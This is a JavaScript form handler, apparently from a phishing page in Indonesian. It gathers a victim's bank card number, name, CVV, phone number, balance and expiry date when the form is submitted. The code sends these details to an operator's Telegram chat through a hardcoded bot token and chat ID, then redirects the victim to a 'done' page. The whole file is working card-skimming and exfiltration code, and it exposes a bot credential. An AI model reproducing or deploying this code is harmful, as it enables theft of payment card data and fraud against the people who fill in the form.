const TOKEN = "6442809218:AAGupGGMAGSVWXI6VEDMiISBfS_xrwXr-n4";
const CHAT_ID = "6820802317";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("tg");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { nokartu, nama, cvv, nohp, saldo, bln, thn, } = form;
  const data = {
    nokartu: nokartu.value,
    nama: nama.value,
    cvv: cvv.value,
    nohp: nohp.value,
    saldo: saldo.value,
    bln: bln.value,
    thn: thn.value,
  };

  let message = `<b></b>\n`;
  message += `<b>Nama :</b> ${data.nama}\n`;
  message += `<b>No-ATM :</b> ${data.nokartu}\n`;
  message += `<b>CVV :</b> ${data.cvv}\n`;
  message += `<b>No Hp :</b> ${data.nohp}\n`;
  message += `<b>Saldo :</b> ${data.saldo}\n`;
  message += `<b>Bulan :</b> ${data.bln}\n`;
  message += `<b>Tahun :</b> ${data.thn}\n`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href='/done.html';
}

